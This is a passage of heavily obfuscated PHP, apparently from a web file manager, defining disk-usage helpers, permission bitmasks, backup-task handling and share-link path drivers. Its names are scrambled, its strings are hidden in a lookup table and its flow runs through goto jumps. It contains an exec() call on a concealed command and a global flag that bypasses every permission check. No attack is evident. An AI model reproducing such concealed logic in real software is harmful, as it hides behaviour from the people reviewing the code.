$eÎ‹«§∑Œ´ = $eï∆¯Ω ™ú[0] && isset($eï∆¯Ω ™ú[0][$a‰áÃüıãÜ[1324]]) ? $eï∆¯Ω ™ú[0][$a‰áÃüıãÜ[1324]] : 0; $c›¢Ø¬ã€¨ = $a‰áÃüıãÜ[2062] . ($eÎ‹«§∑Œ´ ? $a‰áÃüıãÜ[8] . $eÎ‹«§∑Œ´ : $a‰áÃüıãÜ[33]); } $E∏ûé’“πÉ = $GLOBALS[$a‰áÃüıãÜ[6]][$a‰áÃüıãÜ[334]][$a‰áÃüıãÜ[763]]; goto fıÁ£óÉ”ˆ; DÒ∫Ë…ÃÈû: } private function diskDriver() { goto Càá˜êÊûŸ; Fﬂ…ï‘Á∑é: if ($EÇçøÚüﬂ™) { $E‹ñççÑä– = $f≈Üö◊à∑∫[2077]; if (function_exists($f≈Üö◊à∑∫[2078])) { exec($f≈Üö◊à∑∫[2079], $dóä»ÜÂ≥Ü); $E‹ñççÑä– = $dóä»ÜÂ≥Ü[1] . $f≈Üö◊à∑∫[8]; } } if (!file_exists($E‹ñççÑä–)) { return; } $C‰Âà˜úâ¯ = @disk_total_space($E‹ñççÑä–); goto BÍê´÷”®õ; BÍê´÷”®õ: $bÿùŒã∫„≥ = $C‰Âà˜úâ¯ - @disk_free_space($E‹ñççÑä–); return array($f≈Üö◊à∑∫[2064] => $C‰Âà˜úâ¯, $f≈Üö◊à∑∫[2066] => $bÿùŒã∫„≥); goto EÎä∞…¿Àæ; Càá˜êÊûŸ: $f≈Üö◊à∑∫ =& $_SERVER[—Ω]; $E‹ñççÑä– = $f≈Üö◊à∑∫[8]; $EÇçøÚüﬂ™ = $GLOBALS[$f≈Üö◊à∑∫[6]][$f≈Üö◊à∑∫[2075]] == $f≈Üö◊à∑∫[2076]; goto Fﬂ…ï‘Á∑é; EÎä∞…¿Àæ: } public function fileChart($bÚ◊„ç’äè) { goto bòßÇÏä«ä; a…¥§ΩÛ¿∫: $EõãáìÖÛ‡[$B Ã◊¯©µ≤[368]] = 2; $BÏπﬂˆˆÆ– = Model($B Ã◊¯©µ≤[762])->where($EõãáìÖÛ‡)->sum($B Ã◊¯©µ≤[77]); return array($B Ã◊¯©µ≤[708] => $d”ñÈﬁ¥ëÕ[$B Ã◊¯©µ≤[77]], $B Ã◊¯©µ≤[2011] => $d”ñÈﬁ¥ëÕ[$B Ã◊¯©µ≤[2011]], $B Ã◊¯©µ≤[2012] => (int) $cÎï∆Ê≥ôÆ, $B Ã◊¯©µ≤[2013] => (int) $BÏπﬂˆˆÆ–); goto Cû“ºí√µü; AÀ–¬ïµÿƒ: $d”ñÈﬁ¥ëÕ = $this->sourceSize(); $EõãáìÖÛ‡ = array($B Ã◊¯©µ≤[457] => 0, $B Ã◊¯©µ≤[368] => 1); $cÎï∆Ê≥ôÆ = Model($B Ã◊¯©µ≤[762])->where($EõãáìÖÛ‡)->sum($B Ã◊¯©µ≤[77]); goto a…¥§ΩÛ¿∫; bòßÇÏä«ä: $B Ã◊¯©µ≤ =& $_SERVER[—Ω]; if (isset($bÚ◊„ç’äè[$B Ã◊¯©µ≤[1417]])) { return Model($B Ã◊¯©µ≤[762])->userFileTypeProfile($bÚ◊„ç’äè[$B Ã◊¯©µ≤[1417]]); } if (isset($bÚ◊„ç’äè[$B Ã◊¯©µ≤[2080]])) { return Model($B Ã◊¯©µ≤[762])->groupFileTypeProfile($bÚ◊„ç’äè[$B Ã◊¯©µ≤[2080]]); } goto AÀ–¬ïµÿƒ; Cû“ºí√µü: } private function sourceSize() { $dÍ‰ÀŸ÷¯˘ =& $_SERVER[—Ω]; $A™√êÙ–ÊÓ = Model($dÍ‰ÀŸ÷¯˘[762])->where(array($dÍ‰ÀŸ÷¯˘[367] => 0))->sum($dÍ‰ÀŸ÷¯˘[77]); $FŒ⁄ÌçÇÿ∫ = Model($dÍ‰ÀŸ÷¯˘[418])->sum($dÍ‰ÀŸ÷¯˘[77]); if ($FŒ⁄ÌçÇÿ∫ > $A™√êÙ–ÊÓ) { $FŒ⁄ÌçÇÿ∫ = $A™√êÙ–ÊÓ; } return array($dÍ‰ÀŸ÷¯˘[77] => (int) $A™√êÙ–ÊÓ, $dÍ‰ÀŸ÷¯˘[2011] => (int) $FŒ⁄ÌçÇÿ∫); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $CÊ¬ò‘⁄ß« =& $_SERVER[—Ω]; $Bàöƒ…êÉÖ = array(array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2081]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2083], $CÊ¬ò‘⁄ß«[2084] => 6, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2087]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2088], $CÊ¬ò‘⁄ß«[2084] => 1, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2089]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2090], $CÊ¬ò‘⁄ß«[2084] => 2, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2091]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2090], $CÊ¬ò‘⁄ß«[2084] => 3, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2092]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2093], $CÊ¬ò‘⁄ß«[2084] => 4, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_VIEW), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2094]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2095], $CÊ¬ò‘⁄ß«[2084] => 5, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CÊ¬ò‘⁄ß«[383] => LNG($CÊ¬ò‘⁄ß«[2096]), $CÊ¬ò‘⁄ß«[2082] => $CÊ¬ò‘⁄ß«[2097], $CÊ¬ò‘⁄ß«[2084] => 7, $CÊ¬ò‘⁄ß«[2085] => 1, $CÊ¬ò‘⁄ß«[2086] => 0)); return $Bàöƒ…êÉÖ; } public static function authCheck($C èŒùôπå, $A≠â‹∞Ù◊Ï) { $C èŒùôπå = intval($C èŒùôπå); if (_get($GLOBALS, $_SERVER[—Ω][453])) { return !0; } if ($C èŒùôπå <= 0) { return !1; } if (($C èŒùôπå & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C èŒùôπå & $A≠â‹∞Ù◊Ï); } public static function authCheckShow($c∑”ûÆÕü…) { return self::authCheck($c∑”ûÆÕü…, self::AUTH_SHOW); } public static function authCheckView($C¿Ç¨ëºûÜ) { return self::authCheck($C¿Ç¨ëºûÜ, self::AUTH_VIEW); } public static function authCheckDownload($b◊∆“Ì§∑) { return self::authCheck($b◊∆“Ì§∑, self::AUTH_DOWNLOAD); } public static function authCheckUpload($c‚¶—‹À‘Ω) { return self::authCheck($c‚¶—‹À‘Ω, self::AUTH_UPLOAD); } public static function authCheckEdit($C∂í„á◊»”) { return self::authCheck($C∂í„á◊»”, self::AUTH_EDIT); } public static function authCheckRemove($CåâäïÖÙ´) { return self::authCheck($CåâäïÖÙ´, self::AUTH_REMOVE); } public static function authCheckShare($f¡◊Ï€ÆóÊ) { return self::authCheck($f¡◊Ï€ÆóÊ, self::AUTH_SHARE); } public static function authCheckComment($d≥°°ö·¿õ) { return self::authCheck($d≥°°ö·¿õ, self::AUTH_COMMENT); } public static function authCheckEvent($CéÓ€¨ñÓë) { return self::authCheck($CéÓ€¨ñÓë, self::AUTH_EVENT); } public static function authCheckRoot($b⁄÷ñÏˆ¬µ) { return self::authCheck($b⁄÷ñÏˆ¬µ, self::AUTH_ROOT); } public static function authDisable($eœ≠À…ﬂåí, $a£†Ã·‡¥ø) { if (intval($eœ≠À…ﬂåí) <= 0) { return 0; } return intval($eœ≠À…ﬂåí) & ~$a£†Ã·‡¥ø; } public $optionType = "\x53\x79\163\x74\x65\155\56\x73\157\165\x72\x63\145\101\165\164\150\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x61\165\x74\150", "\154\141\x62\145\x6c", "\144\151\x73\160\x6c\141\x79", "\163\171\x73\x74\145\155", "\163\157\x72\x74"); public function initData() { $dıæÇúóéì = $this->authDefault(); foreach ($dıæÇúóéì as $f‚Ï¶Û‘ı∏) { $this->add($f‚Ï¶Û‘ı∏); } } public function listData($d®Û¯¬∆∞ï = false, $b∑ËÔ–¶Êí = "\x73\157\x72\164", $bàﬂœº—÷ô = false) { return parent::listData($d®Û¯¬∆∞ï, $b∑ËÔ–¶Êí, $bàﬂœº—÷ô); } public function update($dµÇéñâòã, $F¯ßô‰∂˘) { $f¢î»—ø©ê =& $_SERVER[—Ω]; $B√µﬁûèáµ = parent::listData($dµÇéñâòã); $eû‡¨∞ôÂÔ = $this->findByName($F¯ßô‰∂˘[$f¢î»—ø©ê[28]]); if (!$B√µﬁûèáµ || $eû‡¨∞ôÂÔ && $eû‡¨∞ôÂÔ[$f¢î»—ø©ê[364]] != $B√µﬁûèáµ[$f¢î»—ø©ê[364]]) { return !1; } $this->filterAuth($F¯ßô‰∂˘[$f¢î»—ø©ê[373]]); return parent::update($dµÇéñâòã, $F¯ßô‰∂˘); } public function remove($CæÕ¬ÃÌÏÒ) { $fäèå∂◊Îú = parent::listData($CæÕ¬ÃÌÏÒ); if (!$fäèå∂◊Îú || $fäèå∂◊Îú[$_SERVER[—Ω][1084]]) { return !1; } return parent::remove($CæÕ¬ÃÌÏÒ); } public function add($BŸ¥∑Ü¢Èƒ = array()) { goto DÍàœí∑ãÕ; bç«Ê∆∆Ë“: return parent::insert($BŸ¥∑Ü¢Èƒ); goto FëÆÇÕı£Ç; f⁄ûÈÔÎ™”: $BŸ¥∑Ü¢Èƒ = array_merge($FﬂÊ÷£ÖßÌ, $BŸ¥∑Ü¢Èƒ); $BŸ¥∑Ü¢Èƒ[$b¢á√˜ñÒë[2101]] = $this->getSort(); $this->filterAuth($BŸ¥∑Ü¢Èƒ[$b¢á√˜ñÒë[373]]); goto bç«Ê∆∆Ë“; DÍàœí∑ãÕ: $b¢á√˜ñÒë =& $_SERVER[—Ω]; if ($this->findByName($BŸ¥∑Ü¢Èƒ[$b¢á√˜ñÒë[28]])) { return !1; } $FﬂÊ÷£ÖßÌ = array($b¢á√˜ñÒë[28] => $b¢á√˜ñÒë[33], $b¢á√˜ñÒë[373] => 1, $b¢á√˜ñÒë[2098] => $b¢á√˜ñÒë[2099], $b¢á√˜ñÒë[2100] => 1, $b¢á√˜ñÒë[1084] => 0, $b¢á√˜ñÒë[2101] => 0); goto f⁄ûÈÔÎ™”; FëÆÇÕı£Ç: } private function getSort() { $bøÀÔè™§£ =& $_SERVER[—Ω]; $b∆¬ﬂûˆ∞À = parent::listData(); $A€ê—˘§èŒ = array_to_keyvalue($b∆¬ﬂûˆ∞À, $bøÀÔè™§£[33], $bøÀÔè™§£[2101]); return empty($A€ê—˘§èŒ) ? 0 : max($A€ê—˘§èŒ) + 1; } private function filterAuth(&$Eä èãÓïá) { goto fêâì‘í ã; fêâì‘í ã: if (!$Eä èãÓïá) { return; } $D˘áÏá™ª• = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $b´÷”€ëˆ¢ = array(); goto cÙ∆ﬂñÈè√; Eƒ±ƒ≠⁄áı: foreach ($b´÷”€ëˆ¢ as $E§ã€±¨…Ì) { if (isset($Dû›ÑÜ°ç⁄[$E§ã€±¨…Ì])) { $b´÷”€ëˆ¢ = array_merge($b´÷”€ëˆ¢, $Dû›ÑÜ°ç⁄[$E§ã€±¨…Ì]); } } $b´÷”€ëˆ¢[] = self::AUTH_SHOW; $Eä èãÓïá = array_sum(array_unique($b´÷”€ëˆ¢)); goto E·Ç™Ìáê™; cÙ∆ﬂñÈè√: foreach ($D˘áÏá™ª• as $E§ã€±¨…Ì) { if ($Eä èãÓïá & $E§ã€±¨…Ì) { $b´÷”€ëˆ¢[] = $E§ã€±¨…Ì; } } if (in_array(self::AUTH_ROOT, $b´÷”€ëˆ¢)) { $Eä èãÓïá = array_sum($D˘áÏá™ª•); return; } $Dû›ÑÜ°ç⁄ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Eƒ±ƒ≠⁄áı; E·Ç™Ìáê™: } public function sort($aÍÌ’Ï∆äÓ, $FÏ»‘Ñ‡ì∫) { return parent::update($aÍÌ’Ï∆äÓ, $FÏ»‘Ñ‡ì∫); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x62\141\143\153\x75\160\x4c\151\x73\x74"; public $field = array("\151\157", "\156\141\155\145", "\x73\164\x61\x74\165\x73", "\x63\157\156\x74\x65\x6e\x74", "\162\x65\x73\165\154\164", "\164\151\x6d\145\x46\x72\157\155", "\164\x69\155\x65\x54\x6f"); public function config() { goto FàÜﬁ¬ÖØƒ; cıÑ´Úë◊∂: if (isset($FçßÑ≠Éù±[$AË‘„¬ø‡Ç[187]])) { $FçßÑ≠Éù±[$AË‘„¬ø‡Ç[187]] = json_decode($FçßÑ≠Éù±[$AË‘„¬ø‡Ç[187]], !0); } if (isset($E¡æÓüüË≤[$AË‘„¬ø‡Ç[187]])) { $FçßÑ≠Éù±[$AË‘„¬ø‡Ç[187]][$AË‘„¬ø‡Ç[1392]] = $E¡æÓüüË≤[$AË‘„¬ø‡Ç[187]]; unset($E¡æÓüüË≤[$AË‘„¬ø‡Ç[187]]); } return array_merge($FçßÑ≠Éù±, $E¡æÓüüË≤); goto D„Í∏¡Ê≠ó; FàÜﬁ¬ÖØƒ: $AË‘„¬ø‡Ç =& $_SERVER[—Ω]; $E¡æÓüüË≤ = Model($AË‘„¬ø‡Ç[1092])->get($AË‘„¬ø‡Ç[722]); $E¡æÓüüË≤ = json_decode($E¡æÓüüË≤, !0); goto D–ê…µ—Ê”; D–ê…µ—Ê”: $E¡æÓüüË≤ = is_array($E¡æÓüüË≤) ? $E¡æÓüüË≤ : array(); if (!isset($E¡æÓüüË≤[$AË‘„¬ø‡Ç[702]])) { $E¡æÓüüË≤[$AË‘„¬ø‡Ç[702]] = $AË‘„¬ø‡Ç[464]; } $FçßÑ≠Éù± = array(); goto dòòŒœÿì; dòòŒœÿì: Action($AË‘„¬ø‡Ç[2102])->taskInit(); $FõÜ…øù¯¢ = Model($AË‘„¬ø‡Ç[2103])->listData(); foreach ($FõÜ…øù¯¢ as $fáæÁ”íÕ∂) { if ($fáæÁ”íÕ∂[$AË‘„¬ø‡Ç[1084]] == $AË‘„¬ø‡Ç[83] && $fáæÁ”íÕ∂[$AË‘„¬ø‡Ç[1405]] == $AË‘„¬ø‡Ç[2104]) { $FçßÑ≠Éù± = $fáæÁ”íÕ∂; break; } } goto cıÑ´Úë◊∂; D„Í∏¡Ê≠ó: } public function listData($a‹©Â¯ƒÉ¬ = false, $F®¯≈≤ÿÁÒ = "\155\x6f\144\x69\146\171\x54\151\155\145", $FÌ≈ÚéÒâé = false) { return parent::listData($a‹©Â¯ƒÉ¬, $F®¯≈≤ÿÁÒ, !0); } public function lastItem() { $fªëÙ»˜ÆÏ = $this->listData(); return !empty($fªëÙ»˜ÆÏ[0]) ? $fªëÙ»˜ÆÏ[0] : null; } public function kill($Aíá√Ó≤Œ ) { goto cÕè›¥ßéá; D¯€ì”¯êÃ: return $this->remove($Aíá√Ó≤Œ ); goto e†∂∑ï„ê; E¡ÌÁù —ª: $A˜çÿ≈»∑å = $Eû£ —±≈[$F‡†˜ŸÂ‚Ã[28]]; $cÓ¡®êí˜æ = TEMP_FILES . $F‡†˜ŸÂ‚Ã[720] . $A˜çÿ≈»∑å . $F‡†˜ŸÂ‚Ã[8]; IO::remove($cÓ¡®êí˜æ, !1); goto D¯€ì”¯êÃ; cÕè›¥ßéá: $F‡†˜ŸÂ‚Ã =& $_SERVER[—Ω]; $Eû£ —±≈ = $this->listData($Aíá√Ó≤Œ ); if (!$Eû£ —±≈ || empty($Eû£ —±≈[$F‡†˜ŸÂ‚Ã[28]])) { return !0; } goto aÜ·±Úä€¢; aÜ·±Úä€¢: Task::kill($F‡†˜ŸÂ‚Ã[721]); Task::kill($F‡†˜ŸÂ‚Ã[739]); Task::kill($F‡†˜ŸÂ‚Ã[746]); goto E¡ÌÁù —ª; e†∂∑ï„ê: } public function remove($AÕÓ≈§ÇŸÊ) { $FÜ¯Œ”Ë≤ı = $this->listData($AÕÓ≈§ÇŸÊ); if (!$FÜ¯Œ”Ë≤ı) { return !0; } return $this->backupRemove($FÜ¯Œ”Ë≤ı); } private function backupRemove($fÚÊÏ¨ñ–æ) { $EÜ‚ÉÊ«¯˜ =& $_SERVER[—Ω]; parent::remove($fÚÊÏ¨ñ–æ[$EÜ‚ÉÊ«¯˜[364]]); $AÙèùÇıöû = "\173\x69\157\x3a{$fÚÊÏ¨ñ–æ[$EÜ‚ÉÊ«¯˜[701]]}\175\57\144\141\x74\x61\142\141\163\145\57\x62\141\x63\153\165\160\137" . $fÚÊÏ¨ñ–æ[$EÜ‚ÉÊ«¯˜[28]]; IO::remove($AÙèùÇıöû, !1); return !0; } public function start() { goto CÜèøé›åç; B∂ù÷µ¬–ü: return !0; goto fπáÂÉ˜â†; CÜèøé›åç: $fÍïÀ…â£¥ =& $_SERVER[—Ω]; if ($GLOBALS[$fÍïÀ…â£¥[6]][$fÍïÀ…â£¥[84]][$fÍïÀ…â£¥[2105]] != $fÍïÀ…â£¥[83]) { return !0; } $F¶°â–üà = $this->config(); goto Fµ´◊˜„ç∆; CÁ·È”Êïè: if (!$dÕ„Œﬂ”œ«->dbFile()) { return !1; } if ($F¶°â–üà[$fÍïÀ…â£¥[702]] == $fÍïÀ…â£¥[464]) { $dÕ„Œﬂ”œ«->file(); } Backup::set(array($fÍïÀ…â£¥[699] => 1, $fÍïÀ…â£¥[713] => time())); goto B∂ù÷µ¬–ü; Fµ´◊˜„ç∆: if (!$F¶°â–üà || $F¶°â–üà[$fÍïÀ…â£¥[1389]] != $fÍïÀ…â£¥[83]) { return !1; } $E”ªÊ≥∫ÕÙ = $this->process(); foreach ($E”ªÊ≥∫ÕÙ as $DÃ¥ôÆ”Ö≈) { if ($DÃ¥ôÆ”Ö≈) { return Task::restart($DÃ¥ôÆ”Ö≈[$fÍïÀ…â£¥[364]]); } } goto Dû¡âªÚûÍ; Dû¡âªÚûÍ: $dÕ„Œﬂ”œ« = new Backup(); $dÕ„Œﬂ”œ«->keep(); if (!$dÕ„Œﬂ”œ«->db()) { return !1; } goto CÁ·È”Êïè; fπáÂÉ˜â†: } public function process() { $F‡ç›óâ±ù =& $_SERVER[—Ω]; return array($F‡ç›óâ±ù[704] => Task::get($F‡ç›óâ±ù[721]), $F‡ç›óâ±ù[707] => Task::get($F‡ç›óâ±ù[739]), $F‡ç›óâ±ù[164] => Task::get($F‡ç›óâ±ù[746])); } public function restore() { $DÏùÈ°ñúÃ =& $_SERVER[—Ω]; ActionCall($DÏùÈ°ñúÃ[2106], !0, 1); ActionCall($DÏùÈ°ñúÃ[2106], !0, 0); } } goto DêÜéÁñÁá; EÙÔÒú«ºª: register_shutdown_function($_SERVER[ªƒÓ™éå][36]); set_error_handler($_SERVER[ªƒÓ™éå][49], $dìŸÒßı¿—); if (function_exists($_SERVER[ªƒÓ™éå][50])) { set_exception_handler($_SERVER[ªƒÓ™éå][51]); } goto bΩ¬’áÎÓ¬; DÍèÈÜ‹§è: class PathDriverDriverShareItem { public function __construct($Cÿﬂ›’úñ◊) { $this->pathParse = $Cÿﬂ›’úñ◊; } public function __call($e—ç©îù‡è, $AΩêÌÊÚçê) { $Fúù˜ÛÌù∏ =& $_SERVER[—Ω]; if (method_exists($this, $e—ç©îù‡è)) { return; } $DöÜîÜ¯ÖΩ = call_user_func_array(array($Fúù˜ÛÌù∏[1121], $e—ç©îù‡è), $AΩêÌÊÚçê); $FÃ√’›ò„Ó = array($Fúù˜ÛÌù∏[1122], $Fúù˜ÛÌù∏[1123], $Fúù˜ÛÌù∏[1124], $Fúù˜ÛÌù∏[1125], $Fúù˜ÛÌù∏[486], $Fúù˜ÛÌù∏[488], $Fúù˜ÛÌù∏[1126], $Fúù˜ÛÌù∏[91], $Fúù˜ÛÌù∏[1127], $Fúù˜ÛÌù∏[1128]); if (in_array($e—ç©îù‡è, $FÃ√’›ò„Ó)) { $DöÜîÜ¯ÖΩ = $this->getPathOuter($DöÜîÜ¯ÖΩ); } return $DöÜîÜ¯ÖΩ; } public function copy($EªäÇ®‰‚≠, $B°ôÇººº¬, $bãñÂÏª‘ú = false) { return $this->copyMove($EªäÇ®‰‚≠, $B°ôÇººº¬, $bãñÂÏª‘ú, $_SERVER[—Ω][486]); } public function move($fóÏ…óÏŸ≈, $fåùÊë—¶‚, $eá›òÂ™†û = false) { return $this->copyMove($fóÏ…óÏŸ≈, $fåùÊë—¶‚, $eá›òÂ™†û, $_SERVER[—Ω][488]); } private function copyMove($bò¨ãÒ§Ë◊, $A£Â ëÚÏ¢, $dã¶⁄È«ª€, $Dµ±Ωü∑äŸ) { goto D¿—©ôÀ¬ÿ; D¿—©ôÀ¬ÿ: $cé⁄œç‡Êπ =& $_SERVER[—Ω]; $Fªô—Õìèè = $A£Â ëÚÏ¢; $e¢ç®ã°‘˘ = IO::driverMake($A£Â ëÚÏ¢); goto e¬°Æ‹°˜Æ; cõ˜∑çãƒ¯: return $CÇˆ’ÙÛ·ˆ; goto Dïıßßæ∏…; e¬°Æ‹°˜Æ: if ($e¢ç®ã°‘˘->pathParse[$cé⁄œç‡Êπ[1002]]) { $A£Â ëÚÏ¢ = $e¢ç®ã°‘˘->pathParse[$cé⁄œç‡Êπ[1002]]; } else { $A£Â ëÚÏ¢ = $Fªô—Õìèè; } $CÇˆ’ÙÛ·ˆ = IO::copyMove($bò¨ãÒ§Ë◊, $A£Â ëÚÏ¢, $dã¶⁄È«ª€, $Dµ±Ωü∑äŸ); $CÇˆ’ÙÛ·ˆ = $this->getPathOuter($CÇˆ’ÙÛ·ˆ); goto cõ˜∑çãƒ¯; Dïıßßæ∏…: } public function pathFather($Fæ«≠Ùœü∑) { return get_path_father($this->pathParse[$_SERVER[—Ω][75]]); } public function iconvSystem($cÙÈˆ–ƒ∂¥) { return $cÙÈˆ–ƒ∂¥; } protected function infoParse($cÎ±õ£“ñ») { $aÔò§≤⁄¡∏ =& $_SERVER[—Ω]; $A¨È·ççÉì = $this->pathParse[$aÔò§≤⁄¡∏[435]][$aÔò§≤⁄¡∏[1022]] . $this->pathParse[$aÔò§≤⁄¡∏[1015]]; $cµÎÃñ≤§ò = IO::info($A¨È·ççÉì); $BÃˆ¨‘ﬂ∫® = $this->pathParse[$aÔò§≤⁄¡∏[435]]; return Action($aÔò§≤⁄¡∏[1120])->_shareItemeParse($cµÎÃñ≤§ò, $BÃˆ¨‘ﬂ∫®); } public function listAll($dàû∂›ÕÃ¯) { $f∆ìø«ﬁàï =& $_SERVER[—Ω]; $d‚âÑÇÔÇà = IO::listAll($dàû∂›ÕÃ¯); $BÊ‹È–ä⁄™ = $this->pathParse[$f∆ìø«ﬁàï[435]]; foreach ($d‚âÑÇÔÇà as &$D¡º»¬ıÙò) { check_abort(); $D¡º»¬ıÙò = array_merge(IO::info($D¡º»¬ıÙò[$f∆ìø«ﬁàï[75]]), $D¡º»¬ıÙò); $D¡º»¬ıÙò[$f∆ìø«ﬁàï[388]] = Action($f∆ìø«ﬁàï[1120])->_shareItemeParse($D¡º»¬ıÙò, $BÊ‹È–ä⁄™); } return $d‚âÑÇÔÇà; } public function getPathOuter($a‘¶øèÜ«º) { goto B‰ì÷ê¡Ñ¿; B‰ì÷ê¡Ñ¿: $fåÆıŒÀ¢ =& $_SERVER[—Ω]; $B…⁄ã˘˘ß÷ = KodIO::parse($a‘¶øèÜ«º); if ($B…⁄ã˘˘ß÷[$fåÆıŒÀ¢[29]] == KodIO::KOD_SHARE_ITEM) { return $B…⁄ã˘˘ß÷[$fåÆıŒÀ¢[75]]; } goto d¿≈©Â£å°; d¿≈©Â£å°: $E €ÇÑ∑”± = KodIO::clear($a‘¶øèÜ«º); $eµùçåá‹ = KodIO::clear($this->pathParse[$fåÆıŒÀ¢[435]][$fåÆıŒÀ¢[1022]]); $aÑÌª‡ë«Á = substr($E €ÇÑ∑”±, strlen($eµùçåá‹)); goto A◊àÁé÷°¿; A◊àÁé÷°¿: if (substr($E €ÇÑ∑”±, 0, strlen($eµùçåá‹)) != $eµùçåá‹) { return !1; } return $this->pathParse[$fåÆıŒÀ¢[1016]] . $fåÆıŒÀ¢[8] . ltrim($aÑÌª‡ë«Á, $fåÆıŒÀ¢[8]); goto aÛ≈ÕÍ¢ª¡; aÛ≈ÕÍ¢ª¡: } public function getType() { $d¬®‘°ÂÏÙ =& $_SERVER[—Ω]; $aäàÿå©≤‰ = str_replace($d¬®‘°ÂÏÙ[71], $d¬®‘°ÂÏÙ[33], get_class($this)); return strtolower($aäàÿå©≤‰); } public function isTypeObject($dÂê÷ÔÉÛ†) { return IO::isTypeObject($dÂê÷ÔÉÛ†); } public function info($AÊ–Œ™°∞à) { return $this->infoParse($AÊ–Œ™°∞à); } public function infoAuth($Fµ™± ÁÇò) { return $this->infoParse($Fµ™± ÁÇò); } public function infoWithChildren($AÚê∞Ñ≠Ú¨) { return $this->infoParse($AÚê∞Ñ≠Ú¨); } public function infoFull($eÑëâ“âå√) { return $this->infoParse($eÑëâ“âå√); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($c ⁄üç≠ﬂ‰) { $this->pathParse = $c ⁄üç≠ﬂ‰; } protected function infoParse($eãÛó˘Œ¿Ç) { $FÜÃ¿Ÿå—î =& $_SERVER[—Ω]; return Action($FÜÃ¿Ÿå—î[1021])->sharePathInfo($this->pathParse[$FÜÃ¿Ÿå—î[75]], !0); } public function listPath($bèÆ‚óå∂Ò, $Dﬁ˜ßƒÓøæ = false) { $bΩäœèé±‘ =& $_SERVER[—Ω]; $cŒ∞¥°˜†Ê = IO::listPath($bèÆ‚óå∂Ò, $Dﬁ˜ßƒÓøæ); foreach ($cŒ∞¥°˜†Ê as $fÊ∑ÓØÆ£Æ => $DåÛ†àÕ™Ì) { if (!in_array($fÊ∑ÓØÆ£Æ, array($bΩäœèé±‘[73], $bΩäœèé±‘[74]))) { continue; } foreach ($DåÛ†àÕ™Ì as $eÇ«ç»—∏ı => $cûâÑÿ≈˜Ì) { $cûâÑÿ≈˜Ì = Action($bΩäœèé±‘[1129])->parsePathChildren($cûâÑÿ≈˜Ì, array($bΩäœèé±‘[384] => $bèÆ‚óå∂Ò)); $cŒ∞¥°˜†Ê[$fÊ∑ÓØÆ£Æ][$eÇ«ç»—∏ı] = Action($bΩäœèé±‘[1021])->shareItemInfo($cûâÑÿ≈˜Ì); } } return $cŒ∞¥°˜†Ê; } public function listAll($f∂Ω◊éÉé◊) { $A•¬Èã“©Â =& $_SERVER[—Ω]; $dı”ãã¶ò¡ = IO::listAll($f∂Ω◊éÉé◊); foreach ($dı”ãã¶ò¡ as &$E◊Ÿª÷äîÕ) { $E◊Ÿª÷äîÕ = array_merge(IO::info($E◊Ÿª÷äîÕ[$A•¬Èã“©Â[75]]), $E◊Ÿª÷äîÕ); $E◊Ÿª÷äîÕ[$A•¬Èã“©Â[388]] = Action($A•¬Èã“©Â[1021])->shareItemInfo($E◊Ÿª÷äîÕ); } return $dı”ãã¶ò¡; } } class PathDriverEOS extends PathDriverBaseS3 { public function 